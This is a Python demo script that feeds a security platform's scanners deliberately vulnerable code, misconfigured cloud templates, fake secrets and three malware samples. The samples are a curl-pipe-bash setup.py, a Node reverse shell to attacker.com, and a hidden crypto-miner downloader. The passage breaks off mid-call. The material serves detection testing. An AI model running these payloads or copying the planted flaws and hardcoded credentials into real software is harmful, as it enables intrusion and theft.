#!/usr/bin/env python3
"""
ALdeci CTEM+ Scanner Sweep Demo — All 8 Native Scanners
=========================================================
Exercises every native scanner against real E-Commerce AWS architecture,
feeds findings into the Brain Pipeline, runs MPTE verification, generates
AutoFix patches, and produces signed evidence bundles.

Usage:
    python scripts/scanner_sweep_demo.py
    python scripts/scanner_sweep_demo.py --verbose
    python scripts/scanner_sweep_demo.py --json

Pillar: V3 (Decision Intelligence) + V5 (MPTE) + V10 (Evidence)
Sprint: 2 — Enterprise Demo (2026-03-06)
Author: Threat Architect Agent
"""

import json
import os
import sys
import time
import urllib.request
import urllib.error
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple

# ── Config ──────────────────────────────────────────────────────────────

BASE_URL = os.getenv("ALDECI_BASE_URL", "http://localhost:8000")
API_TOKEN = os.getenv(
    "FIXOPS_API_TOKEN",
    "aVFf3-1e7EmlXzx37Y8jaCx--yzpd4OJroyIdgXH-vFiylmaN0FDl2vIOAfBA_Oh",
)
HEADERS = {"X-API-Key": API_TOKEN, "Content-Type": "application/json"}
VERBOSE = "--verbose" in sys.argv or "-v" in sys.argv
JSON_OUTPUT = "--json" in sys.argv

# ── Colors ──────────────────────────────────────────────────────────────


class C:
    BOLD = "\033[1m"
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    MAGENTA = "\033[95m"
    DIM = "\033[2m"
    RESET = "\033[0m"

    @staticmethod
    def ok(msg: str) -> str:
        return f"{C.GREEN}✓{C.RESET} {msg}"

    @staticmethod
    def fail(msg: str) -> str:
        return f"{C.RED}✗{C.RESET} {msg}"

    @staticmethod
    def phase(name: str) -> str:
        return (
            f"\n{C.BOLD}{C.CYAN}{'═' * 60}{C.RESET}\n"
            f"{C.BOLD}{C.CYAN}  {name}{C.RESET}\n"
            f"{C.BOLD}{C.CYAN}{'═' * 60}{C.RESET}"
        )

    @staticmethod
    def step(num: int, name: str) -> str:
        return f"\n  {C.BOLD}{C.MAGENTA}Step {num}:{C.RESET} {name}"

    @staticmethod
    def info(msg: str) -> str:
        return f"    {C.DIM}{msg}{C.RESET}"

    @staticmethod
    def warn(msg: str) -> str:
        return f"    {C.YELLOW}⚠{C.RESET} {msg}"


# ── HTTP Client ─────────────────────────────────────────────────────────


def api_call(
    method: str, path: str, body: Any = None, timeout: int = 30
) -> Tuple[int, Any, float]:
    """Make API call and return (status_code, response_body, duration_ms)."""
    url = f"{BASE_URL}{path}"
    data = json.dumps(body).encode() if body else None
    req = urllib.request.Request(url, data=data, headers=HEADERS, method=method)
    start = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            elapsed = (time.monotonic() - start) * 1000
            raw = resp.read().decode()
            try:
                return resp.status, json.loads(raw), elapsed
            except json.JSONDecodeError:
                return resp.status, raw, elapsed
    except urllib.error.HTTPError as e:
        elapsed = (time.monotonic() - start) * 1000
        try:
            err_body = json.loads(e.read().decode())
        except Exception:
            err_body = {"error": str(e)}
        return e.code, err_body, elapsed
    except Exception as e:
        elapsed = (time.monotonic() - start) * 1000
        return 0, {"error": str(e)}, elapsed


# ── E-Commerce Architecture Code Samples ────────────────────────────────

PYTHON_ECOMMERCE_CODE = """
import os
import subprocess
import sqlite3
import hashlib

# VULNERABILITY: Hardcoded database credentials
DB_PASSWORD = "super_secret_prod_password_2024!"
STRIPE_KEY = "sk_live_4eC39HqLyjWDarjtT1zdp7dc"

def search_products(user_query):
    conn = sqlite3.connect("products.db")
    cursor = conn.cursor()
    # VULNERABILITY: SQL Injection - string interpolation in query
    cursor.execute(f"SELECT * FROM products WHERE name LIKE '%{user_query}%'")
    return cursor.fetchall()

def process_order(order_data):
    # VULNERABILITY: Command injection via os.system
    os.system(f"notify-service send '{order_data['customer_email']}'")
    # VULNERABILITY: Insecure hash algorithm
    order_hash = hashlib.md5(str(order_data).encode()).hexdigest()
    return order_hash

def admin_panel(request):
    # VULNERABILITY: Eval injection
    if request.get("debug"):
        result = eval(request["debug_expr"])
        return result
    return None

def download_report(report_url):
    # VULNERABILITY: SSRF - no URL validation
    import urllib.request
    return urllib.request.urlopen(report_url).read()
"""

JAVA_ECOMMERCE_CODE = """
package com.ecommerce.controllers;
import java.sql.*;
import javax.servlet.http.*;

public class UserController {
    private static final String DB_URL = "jdbc:postgresql://db:5432/ecommerce";
    // VULNERABILITY: Hardcoded credentials
    private static final String DB_USER = "admin";
    private static final String DB_PASS = "P@ssw0rd123!";

    public String searchUsers(HttpServletRequest request) throws Exception {
        String query = request.getParameter("q");
        Connection conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASS);
        Statement stmt = conn.createStatement();
        // VULNERABILITY: SQL Injection
        ResultSet rs = stmt.executeQuery(
            "SELECT * FROM users WHERE name LIKE '%" + query + "%'"
        );
        StringBuilder sb = new StringBuilder();
        while (rs.next()) {
            sb.append(rs.getString("name")).append(",");
            sb.append(rs.getString("email")).append(",");
            // VULNERABILITY: Exposing PII
            sb.append(rs.getString("ssn")).append("\\n");
        }
        return sb.toString();
    }

    public void updatePassword(HttpServletRequest request) throws Exception {
        String userId = request.getParameter("id");
        String newPass = request.getParameter("password");
        Connection conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASS);
        // VULNERABILITY: SQL Injection in UPDATE
        conn.createStatement().executeUpdate(
            "UPDATE users SET password='" + newPass + "' WHERE id=" + userId
        );
    }
}
"""

JS_ECOMMERCE_CODE = """
const express = require('express');
const mysql = require('mysql');

const app = express();

// VULNERABILITY: Hardcoded database credentials
const db = mysql.createConnection({
    host: 'prod-db.internal',
    user: 'root',
    password: 'admin123',
    database: 'ecommerce'
});

app.get('/search', (req, res) => {
    // VULNERABILITY: XSS - reflected
    res.send('<h1>Results for: ' + req.query.q + '</h1>');
});

app.post('/admin/exec', (req, res) => {
    // VULNERABILITY: Code injection via eval
    const result = eval(req.body.expression);
    res.json({ result });
});

app.get('/api/user/:id', (req, res) => {
    // VULNERABILITY: SQL Injection
    db.query('SELECT * FROM users WHERE id = ' + req.params.id, (err, rows) => {
        res.json(rows);
    });
});

app.get('/redirect', (req, res) => {
    // VULNERABILITY: Open redirect
    res.redirect(req.query.url);
});
"""

DOCKERFILE_ECOMMERCE = """
# VULNERABILITY: Using latest tag (unpinned)
FROM node:latest

# VULNERABILITY: Running as root (no USER directive)
WORKDIR /app

COPY package*.json ./
RUN npm install

# VULNERABILITY: Copying secrets into image
COPY .env /app/.env
COPY credentials.json /app/credentials.json

COPY . .

# VULNERABILITY: Exposing debug port
EXPOSE 3000 9229

# VULNERABILITY: Using ADD instead of COPY (URL support = risk)
ADD https://raw.githubusercontent.com/acme/config/main/prod.conf /app/config/

# VULNERABILITY: No HEALTHCHECK defined
CMD ["node", "server.js"]
"""

TERRAFORM_ECOMMERCE = """
# E-Commerce AWS Infrastructure

provider "aws" {
  region = "us-east-1"
}

# VULNERABILITY: S3 bucket with public access
resource "aws_s3_bucket" "media" {
  bucket = "ecommerce-media-prod"
  acl    = "public-read"

  versioning {
    enabled = false
  }
}

# VULNERABILITY: No encryption on S3
resource "aws_s3_bucket_server_side_encryption_configuration" "media" {
  bucket = aws_s3_bucket.media.id
  # Missing encryption rule
}

# VULNERABILITY: RDS publicly accessible, no encryption
resource "aws_db_instance" "payments" {
  identifier           = "payments-db"
  engine              = "postgres"
  engine_version      = "14.9"
  instance_class      = "db.r5.xlarge"
  allocated_storage   = 100
  publicly_accessible = true
  storage_encrypted   = false
  deletion_protection = false
  skip_final_snapshot = true

  username = "admin"
  password = "SuperSecretPassword123!"
}

# VULNERABILITY: Security group allows all inbound
resource "aws_security_group" "api" {
  name = "ecommerce-api-sg"

  ingress {
    from_port   = 0
    to_port     = 65535
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

# VULNERABILITY: IAM role with admin access
resource "aws_iam_role" "api_role" {
  name = "ecommerce-api-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Action = "sts:AssumeRole"
      Effect = "Allow"
      Principal = { Service = "ec2.amazonaws.com" }
    }]
  })
}

resource "aws_iam_role_policy" "admin_access" {
  name = "admin-access"
  role = aws_iam_role.api_role.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Action   = "*"
      Effect   = "Allow"
      Resource = "*"
    }]
  })
}

# VULNERABILITY: CloudWatch logs not encrypted
resource "aws_cloudwatch_log_group" "api_logs" {
  name              = "/ecs/ecommerce-api"
  retention_in_days = 7
}
"""

CONFIG_WITH_SECRETS = """
# E-Commerce Production Configuration
database:
  host: prod-db.acme-ecommerce.com
  port: 5432
  username: ecommerce_admin
  password: "Pr0d!P@ssw0rd#2024"
  ssl: false

stripe:
  secret_key: "sk_live_4eC39HqLyjWDarjtT1zdp7dc"
  publishable_key: "pk_live_51NaJkmLpTIkVXxE"
  webhook_secret: "whsec_5N8Ty3kMq2pL9xVm"

aws:
  access_key_id: "AKIAIOSFODNN7EXAMPLE"
  secret_access_key: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
  region: "us-east-1"

jwt:
  secret: "my-super-secret-jwt-key-that-should-be-in-env"
  expiry: 86400

sendgrid:
  api_key: "SG.xxxxxxxxxxxxxxxxxxxx.yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy"

redis:
  url: "redis://:R3d1sP@ss!@redis.internal:6379/0"
"""

MALWARE_SAMPLES = {
    "supply_chain_attack.py": (
        "import os\n"
        "from setuptools import setup\n"
        "os.system('curl http://evil.com/payload | bash')\n"
        "setup(name='legitimate-looking-package', version='1.0.0')\n"
    ),
    "reverse_shell.js": (
        "const net = require('net');\n"
        "const cp = require('child_process');\n"
        "const sh = cp.spawn('/bin/bash', []);\n"
        "const client = new net.Socket();\n"
        "client.connect(4444, 'attacker.com', () => {\n"
        "  client.pipe(sh.stdin);\n"
        "  sh.stdout.pipe(client);\n"
        "});\n"
    ),
    "crypto_miner.rb": (
        "require 'net/http'\n"
        "system('wget http://pool.evil.com/xmrig -O /tmp/.hidden && chmod +x /tmp/.hidden && /tmp/.hidden')\n"
        "loop do\n"
        "  system('/tmp/.hidden --pool pool.evil.com --user attacker --pass x')\n"
        "end\n"
    ),
}

CLOUDFORMATION_TEMPLATE = json.dumps({
    "AWSTemplateFormatVersion": "2010-09-09",
    "Description": "E-Commerce Platform Infrastructure",
    "Resources": {
        "MediaBucket": {
            "Type": "AWS::S3::Bucket",
            "Properties": {
                "BucketName": "ecommerce-media-prod",
                "AccessControl": "PublicRead",
                "VersioningConfiguration": {"Status": "Suspended"},
            },
        },
        "ApiRole": {
            "Type": "AWS::IAM::Role",
            "Properties": {
                "RoleName": "ecommerce-api-role",
                "Policies": [
                    {
                        "PolicyName": "AdminAccess",
                        "PolicyDocument": {
                            "Statement": [
                                {
                                    "Effect": "Allow",
                                    "Action": "*",
                                    "Resource": "*",
                                }
                            ]
                        },
                    }
                ],
            },
        },
        "PaymentDB": {
            "Type": "AWS::RDS::DBInstance",
            "Properties": {
                "Engine": "postgres",
                "PubliclyAccessible": True,
                "StorageEncrypted": False,
                "DeletionProtection": False,
            },
        },
        "ApiGateway": {
            "Type": "AWS::ElasticLoadBalancingV2::LoadBalancer",
            "Properties": {
                "Name": "ecommerce-alb",
                "Scheme": "internet-facing",
            },
        },
    },
})

OPENAPI_SPEC = {
    "openapi": "3.0.0",
    "info": {"title": "E-Commerce API", "version": "2.4.1"},
    "paths": {
        "/api/v1/products": {
            "get": {
                "summary": "Search products",
                "parameters": [
                    {"name": "q", "in": "query", "schema": {"type": "string"}},
                    {"name": "category", "in": "query", "schema": {"type": "string"}},
                ],
            },
            "post": {
                "summary": "Create product",
                "requestBody": {
                    "content": {
                        "application/json": {
                            "schema": {
                                "type": "object",
                                "properties": {
                                    "name": {"type": "string"},
                                    "price": {"type": "number"},
                                    "sku": {"type": "string"},
                                },
                            }
                        }
                    }
                },
            },
        },
        "/api/v1/users/{id}": {
            "get": {
                "summary": "Get user",
                "parameters": [
                    {"name": "id", "in": "path", "schema": {"type": "string"}}
                ],
            },
        },
        "/api/v1/orders": {
            "post": {
                "summary": "Place order",
                "requestBody": {
                    "content": {
                        "application/json": {
                            "schema": {
                                "type": "object",
                                "properties": {
                                    "user_id": {"type": "string"},
                                    "items": {"type": "array"},
                                    "payment_token": {"type": "string"},
                                },
                            }
                        }
                    }
                },
            },
        },
        "/api/v1/payments/{id}": {
            "get": {
                "summary": "Get payment",
                "parameters": [
                    {"name": "id", "in": "path", "schema": {"type": "string"}}
                ],
            },
        },
    },
}

# ── Results Tracking ────────────────────────────────────────────────────


class Results:
    def __init__(self):
        self.phases: List[Dict] = []
        self.current_phase: Optional[Dict] = None
        self.total_pass = 0
        self.total_fail = 0
        self.total_steps = 0
        self.artifacts: Dict[str, Any] = {}
        self.all_findings: List[Dict] = []
        self.start_time = time.monotonic()

    def begin_phase(self, name: str):
        self.current_phase = {"name": name, "steps": [], "pass": 0, "fail": 0}
        if not JSON_OUTPUT:
            print(C.phase(name))

    def end_phase(self):
        p = self.current_phase
        self.phases.append(p)
        status = "PASS" if p["fail"] == 0 else "FAIL"
        color = C.GREEN if status == "PASS" else C.RED
        if not JSON_OUTPUT:
            print(
                f"\n  {C.BOLD}Phase Result: [{color}{status}{C.RESET}] "
                f"{p['pass']}/{p['pass'] + p['fail']} steps passed{C.RESET}"
            )
        self.current_phase = None

    def step(
        self,
        num: int,
        name: str,
        status_code: int,
        method: str,
        path: str,
        elapsed: float,
        details: str = "",
        body: Any = None,
        expected_codes: tuple = (200, 201),
    ):
        self.total_steps += 1
        passed = status_code in expected_codes
        if passed:
            self.total_pass += 1
            self.current_phase["pass"] += 1
        else:
            self.total_fail += 1
            self.current_phase["fail"] += 1

        if not JSON_OUTPUT:
            print(C.step(num, name))
            label = C.ok if passed else C.fail
            print(
                f"    {label(f'HTTP {status_code} {method} {path} ({elapsed:.0f}ms)')}"
            )
            if details:
                print(C.info(details))
        self.current_phase["steps"].append(
            {
                "name": name,
                "status_code": status_code,
                "passed": passed,
                "elapsed_ms": elapsed,
                "details": details,
            }
        )

    def artifact(self, key: str, value: Any):
        self.artifacts[key] = value

    def add_findings(self, findings: List[Dict]):
        self.all_findings.extend(findings)

    def summary(self):
        total_time = (time.monotonic() - self.start_time) * 1000
        phases_passed = sum(1 for p in self.phases if p["fail"] == 0)
        if JSON_OUTPUT:
            print(
                json.dumps(
                    {
                        "total_time_ms": total_time,
                        "phases_total": len(self.phases),
                        "phases_passed": phases_passed,
                        "steps_total": self.total_steps,
                        "steps_passed": self.total_pass,
                        "steps_failed": self.total_fail,
                        "total_findings": len(self.all_findings),
                        "artifacts": {
                            k: str(v)[:100] for k, v in self.artifacts.items()
                        },
                        "phases": [
                            {"name": p["name"], "pass": p["pass"], "fail": p["fail"]}
                            for p in self.phases
                        ],
                    },
                    indent=2,
                )
            )
        else:
            print(
                f"\n{C.BOLD}{'═' * 60}{C.RESET}\n"
                f"{C.BOLD}  ALdeci Scanner Sweep — Results{C.RESET}\n"
                f"{C.BOLD}{'═' * 60}{C.RESET}"
            )
            print(f"  Total time:      {total_time:.0f}ms")
            print(f"  Phases:          {phases_passed}/{len(self.phases)} passed")
            print(
                f"  Steps:           {self.total_pass}/{self.total_steps} passed"
            )
            print(f"  Total findings:  {len(self.all_findings)}")
            print()
            for p in self.phases:
                status = "PASS" if p["fail"] == 0 else "FAIL"
                color = C.GREEN if status == "PASS" else C.RED
                print(
                    f"  [{color}{status}{C.RESET}] "
                    f"{p['name']}: {p['pass']}/{p['pass'] + p['fail']}"
                )
            if self.artifacts:
                print(f"\n  {C.BOLD}Key Artifacts:{C.RESET}")
                for k, v in self.artifacts.items():
                    vstr = str(v)
                    if len(vstr) > 80:
                        vstr = vstr[:77] + "..."
                    print(f"    • {k}: {vstr}")
            overall = "ALL PHASES PASSED" if self.total_fail == 0 else "SOME FAILURES"
            color = C.GREEN if self.total_fail == 0 else C.RED
            print(f"\n  {C.BOLD}Overall: {color}{C.BOLD}{overall}{C.RESET}")
            print(f"{C.BOLD}{'═' * 60}{C.RESET}")

        # Save results to file
        results_dir = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "..", "data", "demo-results"
        )
        os.makedirs(results_dir, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d-%H%M%S")
        results_file = os.path.join(results_dir, f"scanner-sweep-{ts}.json")
        with open(results_file, "w") as f:
            json.dump(
                {
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    "total_time_ms": total_time,
                    "phases_passed": phases_passed,
                    "phases_total": len(self.phases),
                    "steps_passed": self.total_pass,
                    "steps_total": self.total_steps,
                    "total_findings": len(self.all_findings),
                    "artifacts": {
                        k: str(v)[:200] for k, v in self.artifacts.items()
                    },
                    "findings_by_severity": self._count_by_severity(),
                    "scanners_exercised": self._scanners_exercised(),
                },
                f,
                indent=2,
            )
        if not JSON_OUTPUT:
            print(f"\n  {C.DIM}Results saved to: {results_file}{C.RESET}")

    def _count_by_severity(self) -> Dict[str, int]:
        counts: Dict[str, int] = {}
        for f in self.all_findings:
            sev = f.get("severity", "unknown")
            counts[sev] = counts.get(sev, 0) + 1
        return counts

    def _scanners_exercised(self) -> List[str]:
        scanners = []
        for p in self.phases:
            if "SAST" in p["name"]:
                scanners.append("sast")
            elif "DAST" in p["name"]:
                scanners.append("dast")
            elif "Secrets" in p["name"]:
                scanners.append("secrets")
            elif "Container" in p["name"]:
                scanners.append("container")
            elif "IaC" in p["name"] or "CSPM" in p["name"]:
                scanners.append("cspm")
            elif "API Fuzzer" in p["name"]:
                scanners.append("api-fuzzer")
            elif "Malware" in p["name"]:
                scanners.append("malware")
        return scanners


# ── Main Demo Flow ──────────────────────────────────────────────────────


def run_demo():
    r = Results()

    if not JSON_OUTPUT:
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(
            f"\n{C.BOLD}{C.CYAN}"
            f"╔══════════════════════════════════════════════════════════════╗\n"
            f"║                                                              ║\n"
            f"║   ALdeci CTEM+ Scanner Sweep Demo                            ║\n"
            f"║   All 8 Native Scanners + Brain + MPTE + AutoFix + Evidence  ║\n"
            f"║                                                              ║\n"
            f"║   {now}                                    ║\n"
            f"║   Target: {BASE_URL:<48s} ║\n"
            f"║                                                              ║\n"
            f"╚══════════════════════════════════════════════════════════════╝"
            f"{C.RESET}\n"
        )

    # ── Phase 0: Health Check ───────────────────────────────────────────

    r.begin_phase("PHASE 0: HEALTH — Verify all scanner engines are online")
    step = 0

    scanners = [
        ("SAST", "/api/v1/sast/status"),
        ("DAST", "/api/v1/dast/status"),
        ("Secrets", "/api/v1/secrets/status"),
        ("Container", "/api/v1/container/status"),
        ("CSPM/IaC", "/api/v1/cspm/status"),
        ("API Fuzzer", "/api/v1/api-fuzzer/status"),
        ("Malware", "/api/v1/malware/status"),
        ("Brain Pipeline", "/api/v1/brain/stats"),
        ("MPTE", "/api/v1/mpte/stats"),
        ("AutoFix", "/api/v1/autofix/health"),
        ("Evidence", "/api/v1/evidence/"),
        ("Sandbox", "/api/v1/sandbox/health"),
    ]

    for name, path in scanners:
        step += 1
        code, body, elapsed = api_call("GET", path)
        status = body.get("status", body.get("engine", "ok")) if isinstance(body, dict) else "ok"
        r.step(step, f"{name} engine status", code, "GET", path, elapsed, f"status={status}")

    r.end_phase()

    # ── Phase 1: SAST — Static Analysis ─────────────────────────────────

    r.begin_phase("PHASE 1: SAST — Static Application Security Testing")
    step = 0

    # Python SAST
    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/sast/scan/code",
        {"code": PYTHON_ECOMMERCE_CODE, "filename": "ecommerce_service.py", "language": "python", "app_id": "ecommerce-platform"},
    )
    findings = body.get("findings", []) if isinstance(body, dict) else []
    r.step(step, "Python SAST scan", code, "POST", "/api/v1/sast/scan/code", elapsed, f"findings={len(findings)}, by_severity={body.get('by_severity', {})}")
    r.add_findings(findings)
    r.artifact("sast_python_findings", len(findings))

    # Java SAST
    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/sast/scan/code",
        {"code": JAVA_ECOMMERCE_CODE, "filename": "UserController.java", "language": "java", "app_id": "ecommerce-platform"},
    )
    findings = body.get("findings", []) if isinstance(body, dict) else []
    r.step(step, "Java SAST scan", code, "POST", "/api/v1/sast/scan/code", elapsed, f"findings={len(findings)}, by_severity={body.get('by_severity', {})}")
    r.add_findings(findings)
    r.artifact("sast_java_findings", len(findings))

    # JavaScript SAST
    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/sast/scan/code",
        {"code": JS_ECOMMERCE_CODE, "filename": "checkout.js", "language": "javascript", "app_id": "ecommerce-platform"},
    )
    findings = body.get("findings", []) if isinstance(body, dict) else []
    r.step(step, "JavaScript SAST scan", code, "POST", "/api/v1/sast/scan/code", elapsed, f"findings={len(findings)}, by_severity={body.get('by_severity', {})}")
    r.add_findings(findings)
    r.artifact("sast_js_findings", len(findings))

    # Multi-file SAST
    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/sast/scan/files",
        {
            "files": {
                "PaymentService.py": PYTHON_ECOMMERCE_CODE,
                "UserController.java": JAVA_ECOMMERCE_CODE,
                "checkout.js": JS_ECOMMERCE_CODE,
            }
        },
    )
    total_ff = body.get("total_findings", 0) if isinstance(body, dict) else 0
    r.step(step, "Multi-file SAST scan (3 files)", code, "POST", "/api/v1/sast/scan/files", elapsed, f"total_findings={total_ff}")
    r.artifact("sast_multifile_findings", total_ff)

    r.end_phase()

    # ── Phase 2: DAST — Dynamic Analysis ────────────────────────────────

    r.begin_phase("PHASE 2: DAST — Dynamic Application Security Testing")
    step = 0

    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/dast/scan",
        {"target_url": "https://httpbin.org", "crawl": False, "max_depth": 1},
        timeout=45,
    )
    findings = body.get("findings", []) if isinstance(body, dict) else []
    r.step(step, "DAST scan — httpbin.org", code, "POST", "/api/v1/dast/scan", elapsed, f"findings={len(findings)}, urls_crawled={body.get('urls_crawled', [])}")
    r.add_findings(findings)
    r.artifact("dast_findings", len(findings))

    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/dast/scan",
        {"target_url": "https://example.com", "crawl": False, "max_depth": 1},
        timeout=45,
    )
    findings2 = body.get("findings", []) if isinstance(body, dict) else []
    r.step(step, "DAST scan — example.com", code, "POST", "/api/v1/dast/scan", elapsed, f"findings={len(findings2)}")
    r.add_findings(findings2)

    r.end_phase()

    # ── Phase 3: Secrets Scanner ────────────────────────────────────────

    r.begin_phase("PHASE 3: SECRETS — Credential & Secret Detection")
    step = 0

    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/secrets/scan/content",
        {"content": CONFIG_WITH_SECRETS, "filename": "config.yaml", "repository": "ecommerce-platform", "branch": "main"},
    )
    secrets_count = body.get("secrets_found", body.get("total_findings", 0)) if isinstance(body, dict) else 0
    r.step(step, "Secrets scan — config.yaml", code, "POST", "/api/v1/secrets/scan/content", elapsed, f"secrets_found={secrets_count}")
    r.artifact("secrets_found", secrets_count)

    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/secrets/scan/content",
        {"content": PYTHON_ECOMMERCE_CODE, "filename": "ecommerce_service.py", "repository": "ecommerce-platform"},
    )
    secrets2 = body.get("secrets_found", body.get("total_findings", 0)) if isinstance(body, dict) else 0
    r.step(step, "Secrets scan — Python source", code, "POST", "/api/v1/secrets/scan/content", elapsed, f"secrets_found={secrets2}")

    r.end_phase()

    # ── Phase 4: Container Scanner ──────────────────────────────────────

    r.begin_phase("PHASE 4: CONTAINER — Dockerfile & Image Security")
    step = 0

    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/container/scan/dockerfile",
        {"content": DOCKERFILE_ECOMMERCE, "filename": "Dockerfile"},
    )
    container_findings = body.get("findings", []) if isinstance(body, dict) else []
    r.step(step, "Dockerfile scan", code, "POST", "/api/v1/container/scan/dockerfile", elapsed, f"findings={len(container_findings)}, by_severity={body.get('by_severity', {})}")
    r.add_findings(container_findings)
    r.artifact("container_findings", len(container_findings))

    r.end_phase()

    # ── Phase 5: IaC/CSPM — Infrastructure Security ────────────────────

    r.begin_phase("PHASE 5: IaC/CSPM — Infrastructure as Code Security")
    step = 0

    # Terraform
    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/cspm/scan/terraform",
        {"content": TERRAFORM_ECOMMERCE, "filename": "main.tf"},
    )
    iac_findings = body.get("findings", []) if isinstance(body, dict) else []
    r.step(step, "Terraform IaC scan", code, "POST", "/api/v1/cspm/scan/terraform", elapsed, f"findings={len(iac_findings)}, by_severity={body.get('by_severity', {})}")
    r.add_findings(iac_findings)
    r.artifact("iac_terraform_findings", len(iac_findings))

    # CloudFormation
    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/cspm/scan/cloudformation",
        {"content": CLOUDFORMATION_TEMPLATE},
    )
    cf_findings = body.get("findings", []) if isinstance(body, dict) else []
    r.step(step, "CloudFormation scan", code, "POST", "/api/v1/cspm/scan/cloudformation", elapsed, f"findings={len(cf_findings)}, by_severity={body.get('by_severity', {})}")
    r.add_findings(cf_findings)
    r.artifact("iac_cloudformation_findings", len(cf_findings))

    r.end_phase()

    # ── Phase 6: API Fuzzer ─────────────────────────────────────────────

    r.begin_phase("PHASE 6: API FUZZER — OpenAPI-Driven Endpoint Fuzzing")
    step = 0

    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/api-fuzzer/discover",
        {"openapi_spec": OPENAPI_SPEC},
    )
    endpoints = body.get("endpoints", []) if isinstance(body, dict) else []
    r.step(step, "API endpoint discovery", code, "POST", "/api/v1/api-fuzzer/discover", elapsed, f"endpoints_discovered={len(endpoints)}")
    r.artifact("api_endpoints_discovered", len(endpoints))

    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/api-fuzzer/fuzz",
        {
            "base_url": BASE_URL,
            "openapi_spec": OPENAPI_SPEC,
            "headers": {"X-API-Key": API_TOKEN},
            "max_per_endpoint": 3,
        },
        timeout=60,
    )
    fuzz_findings = body.get("findings", []) if isinstance(body, dict) else []
    r.step(step, "API fuzzing (3 iterations/endpoint)", code, "POST", "/api/v1/api-fuzzer/fuzz", elapsed, f"findings={len(fuzz_findings)}, endpoints_fuzzed={body.get('endpoints_fuzzed', 0)}")
    r.add_findings(fuzz_findings)
    r.artifact("api_fuzz_findings", len(fuzz_findings))

    r.end_phase()

    # ── Phase 7: Malware Detection ──────────────────────────────────────

    r.begin_phase("PHASE 7: MALWARE — Malicious Code & Supply Chain Detection")
    step = 0

    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/malware/scan/content",
        {"content": MALWARE_SAMPLES["supply_chain_attack.py"], "filename": "supply_chain_attack.py"},
    )
    malware_findings = body.get("findings", []) if isinstance(body, dict) else []
    r.step(step, "Malware scan — supply chain attack", code, "POST", "/api/v1/malware/scan/content", elapsed, f"findings={len(malware_findings)}, clean={body.get('clean', True)}")
    r.add_findings(malware_findings)

    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/malware/scan/files",
        {"files": MALWARE_SAMPLES},
    )
    multi_malware = body.get("findings", []) if isinstance(body, dict) else []
    r.step(step, "Multi-file malware scan (3 files)", code, "POST", "/api/v1/malware/scan/files", elapsed, f"findings={len(multi_malware)}, files_scanned={body.get('files_scanned', 0)}")
    r.add_findings(multi_malware)
    r.artifact("malware_findings", len(malware_findings) + len(multi_malware))

    r.end_phase()

    # ── Phase 8: Brain Pipeline ─────────────────────────────────────────

    r.begin_phase("PHASE 8: BRAIN — 12-Step Decision Intelligence Pipeline")
    step = 0

    # Prepare findings for brain pipeline from scanner results
    brain_findings = []
    cve_map = {
        "SQL Injection": "CVE-2024-1597",
        "Hardcoded": "CVE-2023-35116",
        "Command Injection": "CVE-2024-22259",
    }
    for i, f in enumerate(r.all_findings[:15]):
        title = f.get("title", f.get("rule_id", f"Finding-{i}"))
        cve_id = None
        for key, cve in cve_map.items():
            if key.lower() in title.lower():
                cve_id = cve
                break
        brain_findings.append({
            "id": f.get("finding_id", f"SWEEP-{i:03d}"),
            "cve_id": cve_id,
            "severity": f.get("severity", "medium"),
            "asset_name": "ecommerce-platform",
            "title": title[:200],
            "description": f.get("description", f.get("message", title))[:500],
            "source": "scanner-sweep",
        })

    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/brain/pipeline/run",
        {
            "org_id": "acme-ecommerce",
            "findings": brain_findings,
            "assets": [
                {"id": "ASS-001", "name": "ecommerce-platform", "criticality": 0.95, "url": "https://api.acme.com", "type": "service"},
                {"id": "ASS-002", "name": "payment-service", "criticality": 1.0, "url": "https://pay.acme.com", "type": "service"},
                {"id": "ASS-003", "name": "media-bucket", "criticality": 0.5, "type": "service"},
            ],
            "source": "scanner-sweep",
            "run_pentest": True,
            "run_playbooks": True,
            "generate_evidence": True,
            "evidence_framework": "PCI-DSS",
            "evidence_timeframe_days": 90,
        },
        timeout=120,
    )
    if isinstance(body, dict):
        run_id = body.get("run_id", "unknown")
        status = body.get("status", "unknown")
        steps_data = body.get("steps", [])
        completed_steps = sum(1 for s in steps_data if s.get("status") == "completed")
        summary_data = body.get("summary", {})
        step_details = " | ".join(
            f"{s['name']}({s['status']},{s.get('duration_ms', 0):.0f}ms)"
            for s in steps_data
        )
        r.step(
            step,
            "Full 12-step pipeline run",
            code,
            "POST",
            "/api/v1/brain/pipeline/run",
            elapsed,
            f"run_id={run_id}, steps={completed_steps}/{len(steps_data)}, "
